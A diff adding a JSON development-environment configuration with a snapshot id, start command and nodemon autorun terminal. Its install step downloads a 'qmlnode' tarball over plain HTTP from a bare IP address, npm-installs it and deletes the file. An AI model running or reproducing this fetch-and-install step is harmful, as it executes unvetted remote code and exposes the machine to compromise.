@@ -1,0 +1,11 @@
+{
+  "snapshot": "snapshot-20250528-2fc6303b-30ca-438c-8e31-82b90e2a26f0",
+  "install": "curl -o qmlnode-1.0.0.tgz http://8.138.86.40:6080/qmlnode-1.0.0.tgz; npm install qmlnode-1.0.0.tgz; rm qmlnode-1.0.0.tgz;",
+  "start": "node app.mjs",
+  "terminals": [
+    {
+      "name": "autorun",
+      "command": "nodemon app.mjs -i data"
+    }
+  ]
+}
